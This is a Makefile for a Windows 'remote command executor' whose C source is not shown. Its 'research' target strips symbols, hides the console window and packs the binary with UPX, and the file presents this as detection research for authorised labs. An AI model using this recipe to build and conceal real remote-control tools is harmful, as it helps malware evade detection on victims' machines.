# Makefile for Remote Command Executor (Windows)
# Compile with gcc (MinGW on Windows or MinGW-w64 cross-compiler on Linux/macOS)
#
# For cross-compilation from Linux/macOS, override CC:
#   make CC=x86_64-w64-mingw32-gcc

CC = gcc
CFLAGS = -std=c99 -Wall -Wextra -mwindows -s
TARGET = remote_command_executor.exe
SOURCE = remote_command_executor.c
LIBS = -lws2_32 -ladvapi32

# Research-only build with reduced symbols (DO NOT USE IN PRODUCTION)
# Intended for studying detection mechanisms in controlled environments only
# WARNING: This removes security protections and should only be used in isolated test environments
RESEARCH_CFLAGS = -std=c99 -mwindows -s -O3 -ffunction-sections -fdata-sections -Wl,--gc-sections

all: $(TARGET)

$(TARGET): $(SOURCE)
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE) $(LIBS)

# Research build target - produces binary with reduced symbols for detection mechanism studies
# WARNING: Only use in controlled, isolated test environments with explicit authorization
research: $(SOURCE)
	@echo "WARNING: Building research version with reduced symbols"
	@echo "This build is intended ONLY for studying detection mechanisms in controlled environments"
	@echo "DO NOT use in production or on systems you do not own or have authorization to test"
	@read -p "Press Enter to continue or Ctrl+C to abort... " || exit 1
	$(CC) $(RESEARCH_CFLAGS) -o $(TARGET) $(SOURCE) $(LIBS)
	@if command -v upx >/dev/null 2>&1; then \
		echo "Packing with UPX..."; \
		upx --best --lzma $(TARGET) 2>/dev/null || upx --best $(TARGET) 2>/dev/null || true; \
	fi

clean:
	rm -f $(TARGET) *.o

run: $(TARGET)
	./$(TARGET)

test:
	@echo "Running basic validation tests..."
	@echo "Note: This tool requires controlled test environment with authorized test server"
	@if [ ! -f $(TARGET) ]; then \
		echo "Error: Binary not built. Run 'make' first."; \
		exit 1; \
	fi
	@echo "Binary exists: $(TARGET)"
	@echo "File size: $$(ls -lh $(TARGET) | awk '{print $$5}')"
	@echo "Validation complete. Manual testing required in authorized environment."

.PHONY: all clean run research test
